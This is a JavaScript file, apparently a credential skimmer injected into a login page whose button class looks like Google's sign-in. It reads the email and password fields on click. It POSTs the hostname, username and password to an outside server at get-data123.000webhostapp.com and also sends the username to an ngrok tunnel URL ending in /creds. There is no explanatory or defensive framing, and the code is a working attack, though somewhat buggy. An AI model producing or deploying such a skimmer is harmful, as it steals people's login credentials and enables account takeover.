let user;
let pass;

function send_email(){
    let email = document.querySelector('[type="email"]');
    let param = email.value;
    
    user = param
}

function send_pwd(){
    const btn = document.getElementsByClassName('VfPpkd-LgbsSe');

    btn[1].addEventListener('click', function(){

    let pwd = document.querySelector('[type="password"]');
    let param = pwd.value;

    pass = param

    })
}

function send_data(usuario, senha){
    const url = 'https://get-data123.000webhostapp.com/user.php';
    const params = {
      hostname: location.host,
      username: usuario,
      password: senha
    };

    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(params)
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error));
}


                                  
                                  
                                  
function teste_send(user){
   var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://7e68-45-162-158-3.sa.ngrok.io/creds?user=" + user, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            console.log(xhr.responseText);
        }
    };
    xhr.send();
}


const btn = document.getElementsByClassName('VfPpkd-LgbsSe');

btn[1].addEventListener('click', function(){
    teste_send(send_email())
    send_email();
    setTimeout(function() {
        pwd = send_pwd()
        send_data(user, pass)
    }, 3000);
    
    
    
})
